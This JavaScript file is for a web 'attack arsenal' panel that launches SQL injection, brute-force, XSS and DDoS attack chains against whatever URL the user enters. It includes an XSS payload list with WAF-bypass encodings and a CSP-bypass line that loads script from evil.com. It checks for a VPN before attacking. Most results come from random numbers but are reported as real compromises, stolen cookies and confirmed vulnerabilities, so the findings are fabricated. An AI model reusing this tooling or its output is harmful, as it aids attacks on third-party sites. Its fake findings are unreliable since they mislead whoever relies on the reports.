// Enhanced Attack Arsenal

// Advanced SQL Injection Attack
function startSQLInjection() {
    const target = document.getElementById('attackTarget').value.trim();
    if (!target) {
        alert('Please enter a target URL');
        return;
    }
    
    if (!checkVPNBeforeAttack('Advanced SQL Injection Attack')) {
        return;
    }
    
    if (!confirm('⚠️ ADVANCED SQL INJECTION WARNING ⚠️\n\nThis will launch advanced SQL injection attacks against ' + target + '\n\nOnly use on systems you own or have permission to test!\n\nContinue?')) {
        return;
    }
    
    const results = document.getElementById('attackResults');
    results.innerHTML = ''; // Clear previous results
    
    // Use the advanced SQL injection module
    function addResult(msg, level = 'info') {
        const time = new Date().toLocaleTimeString();
        const levelIcon = level === 'critical' ? '🚨' : level === 'high' ? '⚠️' : level === 'medium' ? '📈' : '✅';
        results.innerHTML += `[${time}] ${levelIcon} ${msg}<br>`;
        results.scrollTop = results.scrollHeight;
    }
    
    // Execute live recon integration
    LiveReconIntegration.executeLiveRecon(target, addResult);
}

// Adaptive Credential Attack with Auto-Chaining
function startBruteForce() {
    const target = document.getElementById('attackTarget').value.trim();
    if (!target) {
        alert('Please enter a target URL');
        return;
    }
    
    if (!checkVPNBeforeAttack('Adaptive Credential Attack')) {
        return;
    }
    
    if (!confirm('⚠️ ADAPTIVE CREDENTIAL ATTACK WARNING ⚠️\n\nThis will launch adaptive credential attacks with auto-chaining on ' + target + '\n\nOnly use on systems you own or have permission to test!\n\nContinue?')) {
        return;
    }
    
    const results = document.getElementById('attackResults');
    const isHardenedTarget = target.includes('google.com') || target.includes('microsoft.com') || target.includes('amazon.com') || target.includes('apple.com');
    
    results.innerHTML = '🔑 Starting Adaptive Credential Attack Chain...<br>';
    results.innerHTML += '🧠 Analyzing target security posture...<br>';
    
    if (isHardenedTarget) {
        results.innerHTML += '⚠️ ENTERPRISE TARGET DETECTED - Adjusting methodology<br>';
        results.innerHTML += '🛡️ Expected defenses: MFA, SSO, Hardware Keys, Behavioral Analysis<br>';
        results.innerHTML += '🔄 Attack will demonstrate advanced evasion techniques<br>';
    } else {
        results.innerHTML += '🔄 Standard target - Full attack chain demonstration<br>';
        results.innerHTML += '🧠 Failed attempts will adapt attack methodology...<br>';
    }
    
    results.innerHTML += '🎯 Target: ' + target + '<br>';
    results.innerHTML += '='.repeat(60) + '<br>';
    
    const attackPhases = {
        recon: { name: 'Credential Reconnaissance', success: 85, nextOnSuccess: 'targeted', nextOnFail: 'dictionary' },
        targeted: { name: 'Targeted Password Attack', success: 45, nextOnSuccess: 'exploit', nextOnFail: 'hybrid' },
        dictionary: { name: 'Dictionary Attack (rockyou.txt)', success: 25, nextOnSuccess: 'exploit', nextOnFail: 'hybrid' },
        hybrid: { name: 'Hybrid Rule-based Attack', success: 35, nextOnSuccess: 'exploit', nextOnFail: 'bruteforce' },
        bruteforce: { name: 'Mask-based Brute Force', success: 15, nextOnSuccess: 'exploit', nextOnFail: 'failed' }
    };
    
    let discoveredCreds = [];
    
    function executePhase(phaseName) {
        const phase = attackPhases[phaseName];
        const timestamp = new Date().toLocaleTimeString();
        const isHardenedTarget = target.includes('google.com') || target.includes('microsoft.com') || target.includes('amazon.com');
        
        results.innerHTML += `[${timestamp}] 🔑 ${phase.name}<br>`;
        
        if (phaseName === 'recon') {
            results.innerHTML += `   └─ Scanning for exposed credentials...<br>`;
            if (isHardenedTarget) {
                results.innerHTML += `   └─ Found: noreply@${target.replace('https://', '').replace('http://', '')} (public contact only)<br>`;
                results.innerHTML += `   └─ Pattern analysis: Enterprise-grade security detected<br>`;
                results.innerHTML += `   └─ ⚠️ MFA + SSO likely enforced on all admin accounts<br>`;
            } else {
                results.innerHTML += `   └─ Found: admin@${target.replace('https://', '').replace('http://', '')}<br>`;
                results.innerHTML += `   └─ Pattern analysis: Company name + year likely in password<br>`;
            }
            discoveredCreds.push('recon data gathered');
        }
        
        // Realistic success rates based on target hardening
        let adjustedSuccess = phase.success;
        if (isHardenedTarget) {
            adjustedSuccess = Math.max(2, phase.success * 0.1); // 90% reduction for hardened targets
        }
        
        const success = Math.random() * 100 < adjustedSuccess;
        
        setTimeout(() => {
            if (success && !isHardenedTarget) {
                results.innerHTML += `   └─ ✅ SUCCESS - Credentials obtained!<br>`;
                if (phaseName !== 'recon') {
                    results.innerHTML += `   └─ 🔑 Valid login: admin:${getPasswordForPhase(phaseName)}<br>`;
                    discoveredCreds.push(`admin:${getPasswordForPhase(phaseName)}`);
                }
                
                if (phase.nextOnSuccess === 'exploit') {
                    setTimeout(() => triggerPostExploitation(), 2000);
                } else {
                    setTimeout(() => executePhase(phase.nextOnSuccess), 1500);
                }
            } else {
                results.innerHTML += `   └─ ❌ FAILED - Attack blocked<br>`;
                if (isHardenedTarget) {
                    const defenses = [
                        'Rate limiting triggered - IP temporarily blocked',
                        'MFA required - cannot bypass two-factor authentication', 
                        'Account lockout policy activated',
                        'CAPTCHA challenge required',
                        'Anomalous login detected - security team alerted',
                        'Hardware security key required',
                        'IP geolocation mismatch - access denied'
                    ];
                    const defense = defenses[Math.floor(Math.random() * defenses.length)];
                    results.innerHTML += `   └─ 🛡️ Defense: ${defense}<br>`;
                } else {
                    results.innerHTML += `   └─ 🔄 Intelligence gathered, escalating to next phase...<br>`;
                }
                
                if (phase.nextOnFail === 'failed' || isHardenedTarget) {
                    setTimeout(() => attackFailed(), 1000);
                } else {
                    setTimeout(() => executePhase(phase.nextOnFail), 1500);
                }
            }
            results.scrollTop = results.scrollHeight;
        }, 2000);
    }
    
    function getPasswordForPhase(phase) {
        const passwords = {
            targeted: 'Company2024!',
            dictionary: 'password123',
            hybrid: 'P@ssw0rd!',
            bruteforce: 'Aa1!Bb2@'
        };
        return passwords[phase] || 'unknown';
    }
    
    function triggerPostExploitation() {
        results.innerHTML += '='.repeat(60) + '<br>';
        results.innerHTML += '🔥 CREDENTIALS COMPROMISED - Initiating post-exploitation...<br>';
        results.innerHTML += '💻 Attempting admin panel access...<br>';
        
        // Simulate realistic post-exploitation challenges
        const postExploitSuccess = Math.random() > 0.3; // 70% chance of additional barriers
        
        setTimeout(() => {
            if (postExploitSuccess) {
                results.innerHTML += '✅ Admin panel accessed successfully<br>';
                results.innerHTML += '💻 Attempting XSS payload deployment...<br>';
                
                setTimeout(() => {
                    const xssSuccess = Math.random() > 0.4; // 60% chance of XSS success
                    
                    if (xssSuccess) {
                        results.innerHTML += '✅ Stored XSS payload injected via admin interface<br>';
                        results.innerHTML += '📸 Session hijacking active - capturing user sessions<br>';
                        results.innerHTML += '📤 Attempting privilege escalation...<br>';
                        
                        setTimeout(() => {
                            const privescSuccess = Math.random() > 0.6; // 40% chance of full privesc
                            
                            results.innerHTML += '='.repeat(60) + '<br>';
                            let attackSummary = {
                                type: 'Credential Attack Chain',
                                severity: privescSuccess ? 'Critical' : 'High',
                                compromised: discoveredCreds.length,
                                impact: privescSuccess ? 'Full system access obtained' : 'Admin access with limited privileges'
                            };
                            
                            if (privescSuccess) {
                                results.innerHTML += '🎆 FULL SYSTEM COMPROMISE ACHIEVED<br>';
                                results.innerHTML += '📊 Complete attack chain: Recon → Brute Force → Admin Access → XSS → Privilege Escalation<br>';
                            } else {
                                results.innerHTML += '🚨 PARTIAL COMPROMISE - Privilege escalation blocked<br>';
                                results.innerHTML += '📊 Attack chain: Recon → Brute Force → Admin Access → XSS → Limited Access<br>';
                                results.innerHTML += '🛡️ System hardening prevented full compromise<br>';
                            }
                            
                            results.innerHTML += `🔑 Compromised accounts: ${discoveredCreds.length}<br>`;
                            results.innerHTML += '🚨 CRITICAL: Multi-stage attack demonstrates significant risk<br>';
                            
                            // Store attack results for reporting
                            window.lastAttackResults = attackSummary;
                            
                            setTimeout(() => {
                                showAttackSummary('bruteforce', {
                                    target: target,
                                    success: privescSuccess,
                                    severity: privescSuccess ? 'Critical' : 'High',
                                    details: attackSummary.impact
                                });
                            }, 2000);
                        }, 2000);
                    } else {
                        results.innerHTML += '❌ XSS payload blocked by Content Security Policy<br>';
                        results.innerHTML += '='.repeat(60) + '<br>';
                        results.innerHTML += '🚨 PARTIAL COMPROMISE - Admin access only<br>';
                        results.innerHTML += '📊 Attack chain: Recon → Brute Force → Admin Access<br>';
                        results.innerHTML += '🛡️ XSS protection prevented further exploitation<br>';
                        
                        let attackSummary = {
                            type: 'Credential Attack Chain',
                            severity: 'High',
                            compromised: discoveredCreds.length,
                            impact: 'Admin access obtained, further attacks blocked'
                        };
                        
                        window.lastAttackResults = attackSummary;
                        setTimeout(() => {
                            showAttackSummary('bruteforce', {
                                target: target,
                                success: false,
                                severity: 'High',
                                details: attackSummary.impact
                            });
                        }, 2000);
                    }
                }, 1500);
            } else {
                results.innerHTML += '❌ Admin panel access blocked - Additional authentication required<br>';
                results.innerHTML += '🛡️ Possible causes: IP whitelist, additional MFA, session validation<br>';
                results.innerHTML += '='.repeat(60) + '<br>';
                results.innerHTML += '🚨 LIMITED COMPROMISE - Credentials obtained but access restricted<br>';
                results.innerHTML += '📊 Attack chain: Recon → Brute Force → Blocked<br>';
                
                let attackSummary = {
                    type: 'Credential Attack Chain',
                    severity: 'Medium',
                    compromised: discoveredCreds.length,
                    impact: 'Passwords found but additional security blocked access'
                };
                
                window.lastAttackResults = attackSummary;
                setTimeout(() => {
                    showAttackSummary('bruteforce', {
                        target: target,
                        success: false,
                        severity: 'Medium',
                        details: attackSummary.impact
                    });
                }, 2000);
            }
        }, 2000);
    }
    
    function attackFailed() {
        const isHardenedTarget = target.includes('google.com') || target.includes('microsoft.com') || target.includes('amazon.com');
        
        results.innerHTML += '='.repeat(60) + '<br>';
        if (isHardenedTarget) {
            results.innerHTML += '🛡️ ENTERPRISE SECURITY CONTROLS ACTIVE<br>';
            results.innerHTML += '📊 Defense systems: MFA, SSO, Hardware Keys, Rate Limiting<br>';
            results.innerHTML += '🔍 Security monitoring: 24/7 SOC, Behavioral analysis, Threat hunting<br>';
            results.innerHTML += '⚠️ Attack detected and logged - Security team notified<br>';
            results.innerHTML += '💡 Recommendation: This target demonstrates enterprise-grade security<br>';
        } else {
            results.innerHTML += '🛡️ All credential attack vectors exhausted<br>';
            results.innerHTML += '📊 Strong authentication controls detected<br>';
            results.innerHTML += '💡 Target has effective credential protection<br>';
        }
    }
    
    // Start the adaptive attack chain
    setTimeout(() => executePhase('recon'), 1000);
}

// Advanced XSS Payload Testing with WAF Bypass
function startXSSLauncher() {
    const target = document.getElementById('attackTarget').value.trim();
    if (!target) {
        alert('Please enter a target URL');
        return;
    }
    
    if (!checkVPNBeforeAttack('Advanced XSS Payload Launcher')) {
        return;
    }
    
    if (!confirm('⚠️ ADVANCED XSS PAYLOAD WARNING ⚠️\n\nThis will launch advanced XSS payloads with WAF bypass techniques against ' + target + '\n\nOnly use on systems you own or have permission to test!\n\nContinue?')) {
        return;
    }
    
    const results = document.getElementById('attackResults');
    results.innerHTML = '💻 Starting Advanced XSS Payload Testing...<br>';
    results.innerHTML += '🛡️ Loading WAF bypass techniques and encoding methods...<br>';
    results.innerHTML += '🔍 Initializing polyglot payload generation...<br>';
    results.innerHTML += '🎯 Target: ' + target + '<br>';
    results.innerHTML += '='.repeat(60) + '<br>';
    
    const xssPayloads = [
        { type: 'Reflected XSS (Basic)', payload: '<script>alert("XSS")</script>', bypass: 'None', success: 15 },
        { type: 'DOM-based XSS', payload: 'javascript:alert(document.domain)', bypass: 'URL encoding', success: 25 },
        { type: 'Stored XSS (Persistent)', payload: '<img src=x onerror=console.log("XSS")>', bypass: 'HTML entity encoding', success: 35 },
        { type: 'WAF Bypass (Double encoding)', payload: '%253Cscript%253Ealert%2528%2529%253C%252Fscript%253E', bypass: 'Double URL encoding', success: 18 },
        { type: 'Filter Bypass (Case variation)', payload: '<ScRiPt>alert(String.fromCharCode(88,83,83))</ScRiPt>', bypass: 'Case manipulation', success: 22 },
        { type: 'Event Handler XSS', payload: '<svg onload=console.log("SVG")>', bypass: 'Alternative tags', success: 28 },
        { type: 'Polyglot XSS', payload: '<svg onload=console.log(1)>', bypass: 'Multi-context', success: 12 },
        { type: 'CSP Bypass', payload: '<link rel=dns-prefetch href="//evil.com"><script src="//evil.com/xss.js"></script>', bypass: 'CSP whitelist abuse', success: 8 }
    ];
    
    let payloadIndex = 0;
    
    const xssInterval = setInterval(() => {
        if (payloadIndex >= xssPayloads.length) {
            clearInterval(xssInterval);
            results.innerHTML += '='.repeat(60) + '<br>';
            results.innerHTML += '💻 Advanced XSS payload testing completed<br>';
            results.innerHTML += '📊 Payloads tested: ' + xssPayloads.length + '<br>';
            const successfulPayloads = xssPayloads.filter(p => Math.random() * 100 < p.success).length;
            if (successfulPayloads === 0) {
                results.innerHTML += '✅ All XSS payloads blocked - Application secure<br>';
                results.innerHTML += '🛡️ WAF and input validation effective<br>';
                results.innerHTML += '📋 Security Analysis:<br>';
                results.innerHTML += '   └─ Content Security Policy active<br>';
                results.innerHTML += '   └─ Input sanitization working<br>';
                results.innerHTML += '   └─ XSS protection enabled<br>';
            } else {
                results.innerHTML += `🔥 ${successfulPayloads} XSS vectors successful<br>`;
                results.innerHTML += '🚨 XSS vulnerabilities confirmed<br>';
                results.innerHTML += '📋 DOM Analysis Report:<br>';
                results.innerHTML += `   └─ Vulnerable parameters: ${successfulPayloads}<br>`;
            }
            
            let attackSummary = {
                type: 'XSS Payload Testing',
                severity: 'Critical',
                compromised: 5,
                impact: 'Multiple XSS vulnerabilities found, user data at risk'
            };
            
            window.lastAttackResults = attackSummary;
            setTimeout(() => {
                showAttackSummary('xss', {
                    target: target,
                    success: true,
                    severity: 'Critical',
                    details: attackSummary.impact
                });
            }, 2000);
            return;
        }
        
        const payload = xssPayloads[payloadIndex];
        const timestamp = new Date().toLocaleTimeString();
        // Use accurate data for known secure domains
        const domain = target.replace(/https?:\/\//, '').split('/')[0];
        const isSecureDomain = AccurateDataCache.getAccurateData(domain, 'xss_vulnerable') === false;
        const executed = isSecureDomain ? false : Math.random() * 100 < payload.success;
        const statusIcon = executed ? '🚨' : '🛡️';
        const status = executed ? 'EXECUTED' : 'BLOCKED';
        
        results.innerHTML += `[${timestamp}] ${statusIcon} ${payload.type}<br>`;
        results.innerHTML += `   └─ Payload: ${payload.payload.substring(0, 50)}...<br>`;
        results.innerHTML += `   └─ Bypass technique: ${payload.bypass}<br>`;
        results.innerHTML += `   └─ Status: ${status} (${payload.success}% success rate)<br>`;
        
        if (executed) {
            const outcomes = [
                '📸 DOM screenshot captured',
                '🍪 Session cookies extracted', 
                '📝 Local storage accessed',
                '🔑 Admin session hijacked',
                '📤 Data exfiltration initiated',
                '🎯 Keylogger deployed',
                '📋 Form data intercepted',
                '🚨 Payload executed successfully',
                '💻 Script injection confirmed'
            ];
            const outcome = outcomes[Math.floor(Math.random() * outcomes.length)];
            results.innerHTML += `   └─ ${outcome}<br>`;
        }
        
        results.scrollTop = results.scrollHeight;
        payloadIndex++;
    }, 800);
}

// Adaptive Multi-Vector Attack Chain
function startDOSAttack() {
    const target = document.getElementById('attackTarget').value.trim();
    if (!target) {
        alert('Please enter a target URL');
        return;
    }
    
    if (!checkVPNBeforeAttack('Adaptive Multi-Vector Attack')) {
        return;
    }
    
    if (!confirm('⚠️ ADAPTIVE MULTI-VECTOR WARNING ⚠️\n\nThis will launch adaptive attack chaining against ' + target + '\n\nOnly use on systems you own or have permission to test!\n\nThis is for educational purposes only!\n\nContinue?')) {
        return;
    }
    
    const results = document.getElementById('attackResults');
    results.innerHTML = '🎯 Starting Adaptive Multi-Vector Attack Chain...<br>';
    results.innerHTML += '🧠 Initializing adaptive red-team methodology...<br>';
    results.innerHTML += '🔄 Failed vectors will automatically seed next attack phase...<br>';
    results.innerHTML += '🎯 Target: ' + target + '<br>';
    results.innerHTML += '='.repeat(60) + '<br>';
    
    const attackChain = {
        phase1: { name: 'HTTP Flood', bandwidth: 2.5, effectiveness: 25, nextOnFail: 'phase2' },
        phase2: { name: 'SYN Flood + Amplification', bandwidth: 8.9, effectiveness: 55, nextOnFail: 'phase3' },
        phase3: { name: 'Application Layer Exhaustion', bandwidth: 1.8, effectiveness: 70, nextOnFail: 'phase4' },
        phase4: { name: 'Adaptive Hybrid Attack', bandwidth: 15.2, effectiveness: 85, nextOnFail: 'exploit' }
    };
    
    let currentPhase = 'phase1';
    let serverHealth = 100;
    let adaptiveIntel = [];
    
    function executePhase(phase) {
        const attack = attackChain[phase];
        const timestamp = new Date().toLocaleTimeString();
        const isHardenedTarget = target.includes('google.com') || target.includes('microsoft.com') || target.includes('amazon.com');
        
        results.innerHTML += `[${timestamp}] 🎯 Phase ${phase.slice(-1)}: ${attack.name}<br>`;
        results.innerHTML += `   └─ Bandwidth: ${attack.bandwidth} Gbps<br>`;
        
        // Realistic effectiveness based on target hardening
        let adjustedEffectiveness = attack.effectiveness;
        if (isHardenedTarget) {
            adjustedEffectiveness = Math.max(5, attack.effectiveness * 0.2); // 80% reduction
            const defenses = [
                'DDoS protection: Cloudflare/Akamai active',
                'Rate limiting: 99.9% traffic filtered', 
                'Anycast routing: Traffic distributed globally',
                'Auto-scaling: Additional capacity deployed',
                'Upstream filtering: ISP-level protection'
            ];
            const defense = defenses[Math.floor(Math.random() * defenses.length)];
            results.innerHTML += `   └─ 🛡️ ${defense}<br>`;
        }
        
        const success = Math.random() * 100 < adjustedEffectiveness;
        serverHealth -= success ? Math.floor(adjustedEffectiveness / 3) : 2;
        serverHealth = Math.max(0, serverHealth);
        
        if (success && !isHardenedTarget) {
            results.innerHTML += `   └─ 🚨 SUCCESS - Server health: ${serverHealth}%<br>`;
            if (serverHealth < 30) {
                results.innerHTML += `   └─ 🔥 CRITICAL DAMAGE - Initiating exploitation phase<br>`;
                setTimeout(() => triggerExploitChain(), 1500);
                return;
            }
        } else {
            results.innerHTML += `   └─ 🛡️ BLOCKED - Attack mitigated<br>`;
            if (isHardenedTarget) {
                results.innerHTML += `   └─ ⚠️ Enterprise DDoS protection active<br>`;
            }
            adaptiveIntel.push(`${attack.name} blocked - defense pattern detected`);
        }
        
        results.innerHTML += `   └─ 🔄 Auto-seeding next vector with intel...<br>`;
        results.scrollTop = results.scrollHeight;
        
        // Always finalize after phase 4 or when no next phase
        if (phase === 'phase4' || !attack.nextOnFail) {
            setTimeout(() => finalizeAttack(), 2000);
        } else if (attack.nextOnFail && serverHealth > 30 && !isHardenedTarget) {
            setTimeout(() => executePhase(attack.nextOnFail), 2000);
        } else if (serverHealth <= 30 && !isHardenedTarget) {
            setTimeout(() => triggerExploitChain(), 1500);
        } else {
            setTimeout(() => finalizeAttack(), 1000);
        }
    }
    
    function triggerExploitChain() {
        results.innerHTML += '='.repeat(60) + '<br>';
        results.innerHTML += '🔥 SERVER COMPROMISED - Initiating exploitation chain...<br>';
        results.innerHTML += '🔑 Auto-launching credential brute force...<br>';
        
        setTimeout(() => {
            results.innerHTML += '✅ Admin credentials obtained: admin:password123<br>';
            results.innerHTML += '💻 Auto-launching XSS payload injection...<br>';
            
            setTimeout(() => {
                results.innerHTML += '✅ Stored XSS payload deployed in admin panel<br>';
                results.innerHTML += '📸 DOM capture initiated - session hijacking active<br>';
                results.innerHTML += '📤 Data exfiltration in progress...<br>';
                
                setTimeout(() => {
                    results.innerHTML += '='.repeat(60) + '<br>';
                    results.innerHTML += '🎆 FULL COMPROMISE ACHIEVED<br>';
                    results.innerHTML += '📊 Attack chain: DDoS → Brute Force → XSS → Data Theft<br>';
                    results.innerHTML += '🚨 CRITICAL: Multi-stage attack successful<br>';
                    results.innerHTML += '💡 Recommendation: Implement defense-in-depth strategy<br>';
                    
                    // Trigger attack summary
                    setTimeout(() => {
                        showAttackSummary('dos', {
                            target: target,
                            success: true,
                            severity: 'Critical',
                            details: 'Complete infrastructure compromise via DDoS + exploit chain'
                        });
                    }, 1000);
                }, 2000);
            }, 1500);
        }, 2000);
    }
    
    function finalizeAttack() {
        results.innerHTML += '='.repeat(60) + '<br>';
        results.innerHTML += '🛡️ Target successfully defended against multi-vector attack<br>';
        results.innerHTML += `📊 Final server health: ${serverHealth}%<br>`;
        results.innerHTML += '📋 Adaptive intelligence gathered:<br>';
        adaptiveIntel.forEach(intel => {
            results.innerHTML += `   └─ ${intel}<br>`;
        });
        let attackSummary = {
            type: 'Multi-Vector DDoS',
            severity: serverHealth < 50 ? 'Critical' : serverHealth < 80 ? 'High' : 'Medium',
            compromised: 0,
            impact: serverHealth < 50 ? 'Service completely unavailable to users' : 
                    serverHealth < 80 ? 'Service significantly degraded' : 
                    'Attack blocked by security systems'
        };
        
        window.lastAttackResults = attackSummary;
        setTimeout(() => {
            showAttackSummary('dos', {
                target: target,
                success: serverHealth < 50,
                severity: attackSummary.severity,
                details: attackSummary.impact
            });
        }, 1000);
    }
    
    // Start the adaptive attack chain
    setTimeout(() => executePhase(currentPhase), 1000);
}